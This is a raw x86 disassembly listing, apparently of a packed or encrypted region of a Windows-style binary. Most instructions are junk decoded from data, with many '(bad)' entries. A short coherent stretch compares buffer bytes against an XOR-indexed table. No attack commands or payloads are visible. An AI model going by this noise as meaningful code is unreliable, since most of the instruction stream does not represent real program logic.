  4143f7:	data16 out dx,al
  4143f9:	inc    edi
  4143fa:	cmp    eax,0xb40c5312
  4143ff:	lahf   
  414400:	jge    0x41443b
  414402:	imul   ebx,DWORD PTR [eax+0x54edca8b],0x7eaa5bf1
  41440c:	(bad)  
  41440e:	and    eax,0x292994d
  414413:	inc    eax
  414414:	das    
  414415:	jmp    0x158c6be4
  41441a:	xadd   DWORD PTR [ecx+0x77231379],edx
  414421:	test   edi,ebp
  414423:	mov    esp,0x2c68b914
  414428:	ror    DWORD PTR [esi+0x6],0xc4
  41442c:	sbb    ah,ch
  41442e:	sub    al,0x8f
  414430:	pusha  
  414431:	xchg   BYTE PTR [ecx],ch
  414433:	sub    eax,0xd3ba1067
  414438:	ret    0xd803
  41443b:	ja     0x414403
  41443d:	sub    ebx,DWORD PTR [esi-0xa]
  414440:	cmp    BYTE PTR [ecx+edi*1],dl
  414443:	sub    eax,0x4131acee
  414448:	test   eax,0x891466ad
  41444d:	xor    DWORD PTR [ebx+0x56],esi
  414450:	stos   DWORD PTR es:[edi],eax
  414451:	iret   
  414452:	jbe    0x414403
  414454:	jp     0x4144cc
  414456:	loop   0x41448a
  414458:	mov    al,bh
  41445a:	lock pop edi
  41445c:	outs   dx,WORD PTR cs:[esi]
  41445f:	das    
  414460:	unpckhps xmm4,XMMWORD PTR [edi]
  414463:	xchg   ebp,eax
  414464:	mov    ds:0x3111bc29,al
  414469:	retf   
  41446a:	shl    esp,0xe6
  41446d:	stos   BYTE PTR es:[edi],al
  41446e:	fisttp WORD PTR [ebx]
  414470:	jle    0x4143fd
  414472:	mov    WORD PTR [esi-0x253be3d0],ds
  414478:	ins    DWORD PTR es:[edi],dx
  414479:	cli    
  41447a:	bound  eax,QWORD PTR [ecx-0x11]
  41447d:	mov    dl,0x6b
  41447f:	push   ss
  414480:	inc    ebp
  414481:	cmp    al,0xf7
  414483:	into   
  414484:	in     al,0xf
  414486:	xchg   esi,eax
  414487:	iret   
  414488:	out    0x8d,al
  41448a:	xchg   DWORD PTR [eax],ebx
  41448c:	fimul  WORD PTR [ebx+0x6b6c7ba2]
  414492:	jecxz  0x41447d
  414494:	ret    
  414495:	ins    DWORD PTR es:[edi],dx
  414496:	out    0x6b,al
  414498:	push   edx
  414499:	repnz xor eax,0x5f6533b
  41449f:	enter  0xe9ab,0x31
  4144a3:	mov    cl,0xa7
  4144a5:	pop    esi
  4144a6:	test   DWORD PTR [esi],ecx
  4144a8:	outs   dx,BYTE PTR ds:[esi]
  4144a9:	cdq    
  4144aa:	loope  0x4144bb
  4144ac:	dec    ecx
  4144ad:	clc    
  4144ae:	(bad)  
  4144b0:	lods   al,BYTE PTR ds:[esi]
  4144b1:	aaa    
  4144b2:	cld    
  4144b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144b4:	mov    BYTE PTR [ebp-0x13],ah
  4144b7:	push   esp
  4144b8:	imul   edx,DWORD PTR [edx],0x4eaa9641
  4144be:	(bad)
  4144c1:	retf   0x31c8
  4144c4:	mov    dh,al
  4144c6:	mov    ecx,0xcca3ecf
  4144cb:	jg     0x414541
  4144cd:	cmp    edi,eax
  4144cf:	pop    ecx
  4144d0:	data16 ins BYTE PTR es:[edi],dx
  4144d2:	inc    ax
  4144d4:	and    bl,ah
  4144d6:	or     DWORD PTR [esi],esi
  4144d8:	ss pop esp
  4144da:	lds    ecx,FWORD PTR [eax]
  4144dc:	ja     0x41455b
  4144de:	mov    ebx,0x6b644206
  4144e3:	xchg   bh,ch
  4144e5:	mov    edx,0x4d184bad
  4144ea:	or     BYTE PTR [ecx],cl
  4144ec:	and    edi,DWORD PTR [edx-0x63c868a6]
  4144f2:	repz jp 0x4144ca
  4144f5:	into   
  4144f6:	cmp    ebp,ebx
  4144f8:	inc    edx
  4144f9:	fadd   QWORD PTR [ebx+0x7f2bebc]
  4144ff:	pop    ebx
  414500:	mov    dh,0xf0
  414502:	(bad)  
  414503:	(bad)  
  414504:	adc    al,0x3
  414506:	mov    dh,0xd7
  414508:	icebp  
  414509:	dec    ebp
  41450a:	push   es
  41450b:	dec    ebp
  41450c:	dec    eax
  41450d:	les    edx,FWORD PTR [esi-0x7ef9c407]
  414513:	(bad)  
  414514:	jp     0x414587
  414516:	cmp    eax,0x34e24d7f
  41451b:	cmp    DWORD PTR [edx],0x0
  41451e:	retf   
  41451f:	out    dx,al
  414520:	fnstenv [esi+0x6d]
  414523:	jbe    0x414545
  414525:	push   0x58
  414527:	aam    0xdf
  414529:	outs   dx,DWORD PTR ds:[esi]
  41452a:	add    BYTE PTR [ebp+0x61dfbafa],bl
  414530:	pusha  
  414531:	or     BYTE PTR [ebp-0x54193339],dh
  414537:	jo     0x4144e3
  414539:	xor    ebx,edx
  41453b:	add    BYTE PTR [ebx-0xcda83d4],dl
  414541:	pop    es
  414542:	aad    0xbf
  414544:	(bad)  
  414545:	daa    
  414546:	retf   
  414547:	std    
  414548:	xchg   ebp,eax
  414549:	mov    dh,0x26
  41454b:	xor    al,0xb8
  41454d:	ds jp  0x41450e
  414550:	jns    0x41452c
  414552:	xor    ebx,DWORD PTR [ecx-0x75]
  414555:	push   ecx
  414556:	mov    ecx,0xff42e1a7
  41455b:	xchg   ecx,eax
  41455c:	scas   eax,DWORD PTR es:[edi]
  41455d:	mov    BYTE PTR ds:0xc126c5f4,al
  414563:	lahf   
  414564:	fld    TBYTE PTR [edx+0x4]
  414567:	mov    DWORD PTR [ecx],eax
  414569:	pop    ds
  41456a:	cli    
  41456b:	mov    ebx,0x8bf3825b
  414570:	mov    bl,0x1a
  414572:	stos   DWORD PTR es:[edi],eax
  414573:	ins    BYTE PTR es:[edi],dx
  414574:	out    0xd3,eax
  414576:	mov    al,0x75
  414578:	pop    esi
  414579:	jne    0x4145be
  41457b:	and    DWORD PTR [eax+0x18],ecx
  41457e:	orps   xmm4,xmm5
  414581:	mov    eax,0x912fc5bf
  414586:	fild   QWORD PTR [edi-0xfc26b17]
  41458c:	jge    0x4145d2
  41458e:	pop    esi
  41458f:	pop    eax
  414590:	cmp    bh,BYTE PTR [ebx]
  414592:	add    DWORD PTR [edx-0x3c],ecx
  414595:	hlt    
  414596:	cmp    cl,BYTE PTR [ebp+0x4b]
  414599:	aaa    
  41459a:	jbe    0x41452f
  41459c:	cmp    DWORD PTR [eax+esi*2-0x31a0db58],0xffffffac
  4145a4:	pop    ebx
  4145a5:	(bad)  
  4145a6:	xor    dl,BYTE PTR [edx]
  4145a8:	dec    edx
  4145a9:	loopne 0x41456e
  4145ab:	rol    DWORD PTR [esi+0x5c],0x36
  4145af:	retf   
  4145b0:	jp     0x414553
  4145b2:	test   al,0x12
  4145b5:	xor    al,0xf2
  4145b7:	(bad)  [edi]
  4145b9:	and    DWORD PTR [ecx+ebp*2],edi
  4145bc:	call   0xb6be:0x170814c1
  4145c3:	pop    esp
  4145c4:	sub    bh,BYTE PTR [eax-0x3e]
  4145c7:	sbb    ah,ch
  4145c9:	les    esi,FWORD PTR [eax+0x42]
  4145cc:	inc    esp
  4145cd:	aam    0x95
  4145cf:	pusha  
  4145d0:	dec    eax
  4145d1:	push   edx
  4145d2:	fsubrp st(3),st
  4145d4:	mov    esp,0xea93fba8
  4145d9:	pop    ecx
  4145da:	push   ds
  4145db:	inc    esp
  4145dc:	mov    ecx,0xf1cf9cef
  4145e1:	enter  0x152c,0xd5
  4145e5:	inc    esp
  4145e6:	adc    al,0x24
  4145e8:	inc    eax
  4145e9:	add    DWORD PTR [ecx-0x30],edi
  4145ec:	sub    ebp,DWORD PTR [edx]
  4145ee:	lods   al,BYTE PTR ds:[esi]
  4145ef:	cmp    al,0xac
  4145f1:	aaa    
  4145f2:	push   eax
  4145f3:	jge    0x4145cd
  4145f5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4145f7:	loope  0x414636
  4145f9:	push   ebx
  4145fb:	js     0x41460a
  4145fd:	pop    esp
  4145fe:	push   0x20
  414600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414601:	dec    ebx
  414602:	das    
  414603:	sar    ebp,0xa1
  414606:	lock bound ecx,QWORD PTR [edx+0x59]
  41460a:	mov    ds:0xbb34906f,eax
  41460f:	stos   BYTE PTR es:[edi],al
  414610:	test   al,0x11
  414612:	out    0x71,eax
  414614:	sti    
  414615:	mov    ds:0x1d38c013,eax
  41461a:	daa    
  41461b:	bound  eax,QWORD PTR [ecx-0x80]
  41461e:	and    ecx,DWORD PTR [eax-0x5f]
  414621:	mov    edi,0x677c747b
  414626:	not    BYTE PTR [ebp-0x1eec1bc8]
  41462c:	test   eax,0xc595e551
  414631:	(bad)  
  414632:	(bad)
  414635:	bound  eax,QWORD PTR [ecx-0x62]
  414638:	fiadd  WORD PTR [ebx-0x33abe3bc]
  41463e:	adc    ch,cl
  414640:	popa   
  414641:	mov    al,0xc9
  414643:	sub    edi,ebx
  414645:	mov    ?,WORD PTR [eax+0x1b]
  414648:	inc    esi
  414649:	loopne 0x414601
  41464b:	jno    0x414671
  41464d:	in     eax,0x5f
  41464f:	mov    eax,ds:0xc17907f2
  414654:	xchg   esp,eax
  414655:	and    eax,0x71c6c0ef
  41465a:	(bad)  
  41465c:	repnz inc ecx
  41465e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41465f:	adc    ecx,DWORD PTR [ebx-0x70]
  414662:	enter  0x1f53,0x3e
  414666:	ja     0x414632
  414668:	test   DWORD PTR [eax+ecx*2],esi
  41466b:	jmp    0xbe01304e
  414670:	imul   esi,DWORD PTR [edx+0x75],0x6f41faac
  414677:	les    eax,FWORD PTR [ebx]
  414679:	xor    dl,bl
  41467b:	stc    
  41467c:	ds or  al,0x3d
  41467f:	adc    BYTE PTR [ecx+ebp*8-0x44865c38],cl
  414686:	bound  ebx,QWORD PTR [ecx+0x5c]
  414689:	fstp   QWORD PTR ds:0xe0076d57
  41468f:	test   BYTE PTR [ebx],cl
  414691:	fsubr  QWORD PTR [edi+0x6968710c]
  414697:	pop    eax
  414698:	(bad)  
  414699:	cdq    
  41469a:	mov    al,0xd4
  41469c:	fst    st(2)
  41469e:	jecxz  0x41469a
  4146a0:	pop    edi
  4146a1:	popa   
  4146a2:	cs inc eax
  4146a4:	mov    ch,0xb6
  4146a6:	pop    DWORD PTR [edi-0x2352be4]
  4146ac:	add    ah,BYTE PTR [ebp+0x28]
  4146af:	xchg   edx,eax
  4146b0:	or     al,0xab
  4146b2:	push   esp
  4146b3:	xchg   DWORD PTR [esi],ebp
  4146b5:	push   edx
  4146b6:	lock ss (bad) 
  4146b9:	retf   
  4146ba:	pop    DWORD PTR [edi+0x3d8fe0e2]
  4146c0:	call   0x1d6798b1
  4146c5:	clc    
  4146c6:	inc    esp
  4146c7:	in     al,0x70
  4146c9:	(bad)  
  4146ca:	fst    QWORD PTR [ebp+eiz*8+0x6c9ad269]
  4146d1:	sbb    eax,0x2afd38e7
  4146d6:	xor    BYTE PTR [ecx],0x42
  4146d9:	es xchg esp,eax
  4146db:	(bad)  
  4146dc:	and    DWORD PTR [esi+ebp*4],ecx
  4146df:	jle    0x414751
  4146e1:	jge    0x414753
  4146e3:	fwait
  4146e4:	popa   
  4146e5:	xor    al,0x25
  4146e7:	push   ebx
  4146e8:	inc    ebp
  4146e9:	add    DWORD PTR [edi+0x6],ebx
  4146ec:	fprem  
  4146ee:	and    ah,bl
  4146f0:	jns    0x414759
  4146f2:	stos   DWORD PTR es:[edi],eax
  4146f3:	pop    ss
  4146f4:	mov    ch,0x86
  4146f6:	jnp    0x414769
  4146f8:	cwde   
  4146f9:	shr    BYTE PTR [eax-0x40],0xea
  4146fd:	ds aam 0x92
  414700:	adc    DWORD PTR [edx+0x2b7aaab5],edi
  414706:	pop    esi
  414707:	xchg   edi,eax
  414708:	(bad)  
  414709:	out    0x24,al
  41470b:	in     eax,dx
  41470c:	xor    DWORD PTR cs:[edi+0x5e],0xffffffa7
  414711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414712:	js     0x4146f2
  414714:	adc    al,0xee
  414716:	mov    cl,0x73
  414718:	bnd jl 0x4146c2
  41471b:	addr16 cld 
  41471d:	sub    BYTE PTR [edx-0x3480663e],bl
  414723:	mov    al,ds:0x7ca878d5
  414728:	adc    al,0x31
  41472a:	inc    edx
  41472b:	sub    BYTE PTR [ebx+0x25],bl
  41472e:	std    
  41472f:	add    edi,DWORD PTR [edi]
  414731:	loop   0x414794
  414733:	lods   al,BYTE PTR ds:[esi]
  414734:	mov    ds:0xe849d5bf,al
  414739:	mov    WORD PTR [ecx+0xc],?
  41473c:	dec    edx
  41473d:	bound  edi,QWORD PTR [ebp+0x579c3c86]
  414743:	dec    ebx
  414744:	loope  0x414789
  414746:	cmp    DWORD PTR [ecx+edx*4+0x1a],esi
  41474a:	and    eax,0x30d46627
  41474f:	dec    edx
  414750:	mov    edx,0xeea1635f
  414755:	and    eax,0x5de18a9b
  41475a:	jb     0x4147d8
  41475c:	add    DWORD PTR [edi+eax*2+0xc],ebx
  414760:	stos   DWORD PTR es:[edi],eax
  414761:	sbb    BYTE PTR [edx-0x341b3e7f],dl
  414767:	pusha  
  414768:	jbe    0x4147c4
  41476a:	mov    dh,0x65
  41476c:	loop   0x414751
  41476e:	shr    DWORD PTR [edx],cl
  414770:	test   eax,0xb146c842
  414775:	xchg   esp,eax
  414776:	inc    esp
  414777:	xlat   BYTE PTR ds:[ebx]
  414778:	pusha  
  414779:	ss enter 0xf397,0x83
  41477e:	add    bl,dl
  414780:	dec    ebx
  414781:	cmp    BYTE PTR [edi+0x72],bl
  414784:	addr16 or esp,ebp
  414787:	das    
  414788:	into   
  414789:	pop    eax
  41478a:	aad    0x4d
  41478c:	aam    0x16
  41478e:	mov    DWORD PTR [esi+0x7d87cf16],ecx
  414794:	adc    cl,al
  414796:	out    0xff,al
  414798:	dec    ebp
  414799:	jmp    0x227e:0x2dcb42f0
  4147a0:	push   0x45e56c20
  4147a5:	mov    al,0xc0
  4147a7:	pushf  
  4147a8:	inc    edi
  4147a9:	jge    0x4147cf
  4147ab:	add    al,0xc1
  4147ad:	out    dx,eax
  4147ae:	xchg   DWORD PTR [ebp+0x43a5c859],esi
  4147b4:	mov    ebp,0xa9bdedaa
  4147b9:	adc    BYTE PTR [ecx],ah
  4147bb:	popa   
  4147bc:	pusha  
  4147bd:	clc    
  4147be:	jle    0x4147c2
  4147c0:	inc    eax
  4147c1:	mov    BYTE PTR [esi],bl
  4147c3:	cwde   
  4147c4:	or     DWORD PTR [ebx],0xffffffb9
  4147c7:	sbb    edi,DWORD PTR [ebp+0x4cabd54d]
  4147cd:	je     0x414800
  4147cf:	push   esp
  4147d0:	xor    al,al
  4147d2:	add    ah,bh
  4147d4:	push   ebx
  4147d5:	xor    DWORD PTR [eax],ebx
  4147d7:	stos   BYTE PTR es:[edi],al
  4147d8:	dec    edx
  4147d9:	imul   ebx,DWORD PTR [esi+0x3],0x67
  4147dd:	adc    eax,0x27e81458
  4147e2:	int    0xa3
  4147e4:	jnp    0x414844
  4147e6:	and    DWORD PTR [esi-0x41],ebp
  4147e9:	dec    eax
  4147ea:	leave  
  4147eb:	fldenv [eax+ebx*2]
  4147ee:	outs   dx,BYTE PTR ds:[esi]
  4147ef:	sahf   
  4147f0:	jmp    0xe76d8feb
  4147f5:	(bad)  
  4147f6:	mov    ebp,0x81faf94e
  4147fb:	mov    edx,0x88ede4b8
  414800:	test   BYTE PTR [ecx],cl
  414802:	and    dh,ah
  414804:	cmp    eax,0xde937d
  414809:	adc    BYTE PTR [edi+0x238e6bb3],dl
  41480f:	imul   ebp,DWORD PTR fs:[ebx-0xcc42e05],0x26
  414817:	(bad)  
  414819:	daa    
  41481a:	or     al,0xf0
  41481c:	adc    BYTE PTR ss:[edx-0x1c],al
  414820:	inc    ebx
  414821:	stos   BYTE PTR es:[edi],al
  414822:	pop    ecx
  414823:	cmc    
  414824:	mov    ds:0x43140b31,al
  414829:	jno    0x4147d3
  41482b:	push   es
  41482c:	mov    ebp,es
  41482e:	push   0xc1eba7b7
  414833:	ja     0x414821
  414835:	mov    al,0xb9
  414837:	push   ecx
  414838:	mov    bl,BYTE PTR [ecx-0x71fc08c9]
  41483e:	adc    DWORD PTR [esi+0x65],eax
  414841:	pop    ebp
  414842:	loope  0x41486a
  414844:	dec    esi
  414845:	xor    esp,DWORD PTR [edx+0x2c]
  414848:	xchg   DWORD PTR ds:0xc542acc9,esi
  41484e:	int3   
  41484f:	jmp    0x8aff3de1
  414854:	ret    0x161e
  414857:	outs   dx,DWORD PTR ds:[esi]
  414858:	add    edi,ecx
  41485a:	sbb    DWORD PTR [esi+0x39438699],ebx
  414860:	adc    eax,0x965d976c
  414865:	xchg   esi,eax
  414866:	outs   dx,DWORD PTR ds:[esi]
  414867:	or     al,0xb8
  414869:	scas   eax,DWORD PTR es:[edi]
  41486a:	std    
  41486b:	and    eax,0x43bd9be0
  414870:	sbb    DWORD PTR [ecx],ebp
  414872:	(bad)  [edx]
  414874:	scas   al,BYTE PTR es:[edi]
  414875:	or     al,BYTE PTR [esi]
  414877:	jmp    0xd9f9:0x2cca9a50
  41487e:	inc    edi
  41487f:	scas   al,BYTE PTR es:[edi]
  414880:	out    0x7e,eax
  414882:	(bad)  
  414883:	cmp    BYTE PTR [eax-0x423d3f37],cl
  414889:	and    ebp,esp
  41488b:	fistp  WORD PTR fs:[ebx-0xdd9dadb]
  414892:	fisub  DWORD PTR [ebp-0x56]
  414895:	in     al,dx
  414896:	js     0x4148c1
  414898:	or     DWORD PTR [edx+0x3fded4d9],edx
  41489e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41489f:	or     ecx,ecx
  4148a1:	xor    ah,al
  4148a3:	ja     0x4148ca
  4148a5:	push   edi
  4148a6:	pop    esi
  4148a7:	inc    ecx
  4148a8:	shl    ch,cl
  4148aa:	je     0x41483b
  4148ac:	dec    eax
  4148ad:	dec    ebp
  4148ae:	dec    ebp
  4148af:	push   ds
  4148b0:	cmp    eax,0xd75012ed
  4148b5:	xor    dl,BYTE PTR gs:[edx-0x13e440dc]
  4148bc:	inc    edx
  4148be:	xor    edx,DWORD PTR [edi-0x31]
  4148c1:	sti    
  4148c2:	xchg   esp,eax
  4148c3:	or     ebx,ebp
  4148c5:	gs je  0x4148b1
  4148c8:	inc    edx
  4148c9:	nop
  4148ca:	mov    ah,0x44
  4148cc:	pusha  
  4148cd:	loope  0x414912
  4148cf:	mov    cl,ch
  4148d1:	mov    cl,0x13
  4148d3:	aas    
  4148d4:	fild   QWORD PTR [ebx-0x212f9765]
  4148da:	pop    esp
  4148db:	shr    BYTE PTR [edx],1
  4148dd:	or     eax,0x2cc7e3e
  4148e3:	or     esi,esi
  4148e5:	adc    bl,BYTE PTR [ebp-0x7b]
  4148e8:	cli    
  4148e9:	test   DWORD PTR [ecx-0x488b51ce],0xcf1c81b0
  4148f3:	sbb    al,0x63
  4148f5:	mov    ah,0xa4
  4148f7:	cmp    eax,0x288e8ef5
  4148fc:	adc    BYTE PTR [esi],0x3d
  4148ff:	pusha  
  414900:	inc    esp
  414901:	sub    DWORD PTR ds:0xac97cd70,ecx
  414907:	gs add ecx,edx
  41490a:	mov    al,0xc5
  41490c:	sub    DWORD PTR ds:0x558b17e6,edi
  414912:	hlt    
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    ah,BYTE PTR [ecx]
  414990:	lea    edx,[edx+0x7a944eb2]
  414996:	jnp    0x414949
  414998:	pushf  
  414999:	jnp    0x414a16
  41499b:	xor    BYTE PTR [edx+0xe6ba365],bh
  4149a1:	cs push edi
  4149a3:	mov    edx,0x1e6d91be
  4149a8:	sbb    al,BYTE PTR [edx]
  4149aa:	idiv   edi
  4149ac:	xor    edx,DWORD PTR [eax*1-0x3a7ba236]
  4149b3:	dec    ebp
  4149b4:	mov    edi,0x265fd178
  4149b9:	pop    edi
  4149ba:	add    ch,BYTE PTR [ebx]
  4149bc:	jns    0x4149c6
  4149be:	std    
  4149bf:	push   0xc0a270b1
  4149c4:	xchg   al,bh
  4149c6:	cwde   
  4149c7:	or     al,0x9e
  4149c9:	retf   0xb72d
  4149cc:	and    ah,al
  4149ce:	dec    ecx
  4149cf:	pop    ss
  4149d0:	add    bl,BYTE PTR [edx+0x53]
  4149d3:	jns    0x414a4d
  4149d5:	sbb    BYTE PTR [ecx-0x27e21ed4],cl
  4149db:	aas    
  4149dc:	stc    
  4149dd:	jno    0x4149f3
  4149df:	das    
  4149e0:	les    edx,FWORD PTR [eax+0x767a0d2]
  4149e6:	imul   edx,DWORD PTR [ecx+0x22758d0b],0xffffffc9
  4149ed:	repz add eax,0x994ac4a7
  4149f3:	jo     0x414a08
  4149f5:	and    ecx,edx
  4149f7:	jmp    0x2b43:0xf0b2b467
  4149fe:	push   ds
  4149ff:	and    edi,DWORD PTR [edi-0x2bfcdf73]
  414a05:	repnz sub dl,0x41
  414a09:	or     eax,DWORD PTR [esi+ebp*4]
  414a0c:	fsubrp st(5),st
  414a0e:	das    
  414a0f:	and    DWORD PTR ds:0xe99109fe,eax
  414a15:	or     eax,0x9ffd3cc5
  414a1a:	rol    DWORD PTR [ebx+ebp*4],cl
  414a1d:	fist   DWORD PTR [ecx]
  414a1f:	inc    BYTE PTR [ebx-0x73]
  414a22:	cmp    al,0xb1
  414a24:	shl    BYTE PTR [ebx-0x369ad1f3],0x33
  414a2b:	mov    ebx,0xcff4e192
  414a30:	xor    dl,BYTE PTR [ebx]
  414a32:	cmp    DWORD PTR [edx-0x59affe46],ebx
  414a38:	fdivr  DWORD PTR [edi-0x21]
  414a3b:	pusha  
  414a3c:	ficom  WORD PTR [ebp-0x3c599f1c]
  414a42:	in     al,dx
  414a43:	inc    ebx
  414a44:	adc    DWORD PTR [ebp+0x4989c92f],ebx
  414a4a:	push   ecx
  414a4b:	mov    esp,0x16a0482e
  414a50:	mov    ah,0x9a
  414a52:	inc    eax
  414a53:	std    
  414a54:	mov    ah,0x76
  414a56:	outs   dx,BYTE PTR ds:[esi]
  414a57:	xor    bh,bl
  414a59:	lea    ebx,[ecx+esi*2+0x2256d64f]
  414a60:	retf   0x2baf
  414a63:	or     bh,BYTE PTR ds:0x5d43d81e
  414a69:	cmp    al,0xf0
  414a6b:	jo     0x414a4a
  414a6d:	adc    eax,DWORD PTR [edi+ecx*2]
  414a70:	xchg   ebp,eax
  414a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a72:	fisubr DWORD PTR [ecx]
  414a74:	shr    dl,1
  414a76:	dec    ecx
  414a77:	out    dx,eax
  414a78:	cmp    al,0xf5
  414a7a:	pop    esi
  414a7b:	pop    ebp
  414a7c:	ins    BYTE PTR es:[edi],dx
  414a7d:	and    esi,eax
  414a7f:	dec    eax
  414a80:	mov    ebp,0x28bdc335
  414a85:	fistp  QWORD PTR [eax+0x7ebf714c]
  414a8b:	iret   
  414a8c:	xchg   edi,eax
  414a8d:	pop    ebp
  414a8e:	ret    
  414a8f:	xor    eax,0x1add0041
  414a94:	sbb    eax,0xcbf361ba
  414a99:	daa    
  414a9a:	sbb    BYTE PTR [bx-0x4d71],ah
  414a9f:	shr    DWORD PTR [ebp-0x4357fc27],1
  414aa5:	adc    DWORD PTR [eax+0x7ae04f1a],0xffffffa1
  414aac:	outs   dx,DWORD PTR ds:[esi]
  414aad:	jno    0x414a97
  414aaf:	je     0x414aa1
  414ab1:	mov    ebx,0x1033aaf7
  414ab6:	aas    
  414ab7:	es dec edi
  414ab9:	sbb    dl,al
  414abb:	dec    ebx
  414abc:	xchg   ebx,eax
  414abd:	push   es
  414abe:	cli    
  414abf:	xor    eax,0x1d828e7b
  414ac4:	stos   DWORD PTR es:[edi],eax
  414ac5:	sbb    ecx,DWORD PTR [eax-0x80]
  414ac8:	mov    ds:0xe2e8261f,al
  414acd:	mov    al,0x36
  414acf:	xlat   BYTE PTR ds:[ebx]
  414ad0:	push   0x6c1d3f3e
  414ad5:	out    dx,eax
  414ad6:	sar    BYTE PTR [edi+0x34],1
  414ad9:	and    eax,0x956f64d
  414ade:	clc    
  414adf:	ja     0x414a90
  414ae1:	cs jae 0x414a82
  414ae4:	stc    
  414ae5:	cmp    al,0xc5
  414ae7:	pop    edi
  414ae8:	sti    
  414ae9:	setae  BYTE PTR [ecx-0x51a32ccd]
  414af0:	rcr    BYTE PTR [ecx],cl
  414af2:	cmp    dh,dh
  414af4:	jmp    0x414b34
  414af6:	add    BYTE PTR [ecx+edx*2],cl
  414af9:	adc    BYTE PTR [esp+ebx*1-0x51],ch
  414afd:	xchg   ecx,eax
  414afe:	sbb    eax,0xbda58558
  414b03:	ins    DWORD PTR es:[edi],dx
  414b04:	add    al,0xfa
  414b06:	and    bh,dh
  414b08:	test   BYTE PTR [edx-0x30],dh
  414b0b:	pop    es
  414b0c:	aam    0xb2
  414b0e:	pop    ds
  414b0f:	ja     0x414aeb
  414b11:	loop   0x414aad
  414b13:	mov    ah,BYTE PTR [edi]
  414b15:	(bad)
  414b18:	es sti 
  414b1a:	and    BYTE PTR [edx],dl
  414b1c:	adc    ch,al
  414b1e:	inc    edx
  414b1f:	aam    0xa0
  414b21:	mov    al,BYTE PTR [eax-0x43]
  414b24:	or     ah,0xf0
  414b27:	aas    
  414b28:	loopne 0x414aed
  414b2a:	jne    0x414b17
  414b2c:	outs   dx,BYTE PTR ds:[esi]
  414b2d:	push   edx
  414b2e:	in     al,dx
  414b2f:	push   0x3ed54db9
  414b34:	jg     0x414b66
  414b36:	push   cs
  414b37:	jbe    0x414b5c
  414b39:	lods   al,BYTE PTR ds:[esi]
  414b3a:	mov    ah,0xb7
  414b3c:	mov    edx,0x87ac6056
  414b41:	jp     0x414bc2
  414b43:	call   0x301a5e59
  414b48:	add    ebp,DWORD PTR [esi-0x49]
  414b4b:	out    dx,eax
  414b4c:	adc    bh,BYTE PTR [eax]
  414b4e:	inc    edi
  414b4f:	ret    0x1178
  414b52:	sbb    DWORD PTR [esi+0x1c],edx
  414b55:	outs   dx,DWORD PTR ds:[esi]
  414b56:	bound  ebx,QWORD PTR [ebx-0x72f90f9e]
  414b5c:	out    0xb4,al
  414b5e:	pop    edi
  414b5f:	jne    0x414b9a
  414b61:	jae    0x414bbc
  414b63:	xor    al,0x6a
  414b65:	jp     0x414b40
  414b67:	pop    ds
  414b68:	iret   
  414b69:	scas   al,BYTE PTR es:[edi]
  414b6a:	(bad)  
  414b6b:	int3   
  414b6c:	stos   DWORD PTR es:[edi],eax
  414b6d:	or     al,0xed
  414b6f:	xchg   ebx,eax
  414b70:	add    eax,0x77bd6828
  414b75:	xor    eax,0xf66c5da7
  414b7a:	fdivr  DWORD PTR [esi-0x7b]
  414b7d:	addr16 jle 0x414b56
  414b80:	jns    0x414bb8
  414b82:	pop    ebx
  414b83:	jo     0x414bc9
  414b85:	cmp    edi,eax
  414b87:	mov    cl,0x63
  414b89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b8a:	call   DWORD PTR [esi-0x11]
  414b8d:	fiadd  WORD PTR [ebx]
  414b8f:	out    dx,eax
  414b90:	sbb    eax,0xb4167e37
  414b95:	push   ebx
  414b96:	mov    bl,0xa6
  414b98:	retf   0x6443
  414b9b:	clc    
  414b9c:	stos   BYTE PTR es:[edi],al
  414b9d:	(bad)  
  414b9e:	pop    ecx
  414b9f:	pop    edi
  414ba0:	cld    
  414ba1:	mov    fs,esp
  414ba3:	push   ebp
  414ba4:	dec    ebx
  414ba5:	pop    edx
  414ba6:	das    
  414ba7:	into   
  414ba8:	or     DWORD PTR [ecx+0x45],ecx
  414bab:	pop    ds
  414bac:	jle    0x414be3
  414bae:	sub    BYTE PTR [ecx+edi*1+0x60],bh
  414bb2:	jno    0x414b3b
  414bb4:	addr16 pop ebx
  414bb6:	data16 mov bl,0x23
  414bb9:	pop    ecx
  414bba:	xchg   ecx,eax
  414bbb:	cmp    bl,dh
  414bbd:	jge    0x414bf3
  414bbf:	loope  0x414b4a
  414bc1:	push   ss
  414bc2:	mov    esi,0x93924855
  414bc7:	in     eax,dx
  414bc8:	sar    BYTE PTR [ebx],cl
  414bca:	dec    ebx
  414bcb:	cdq    
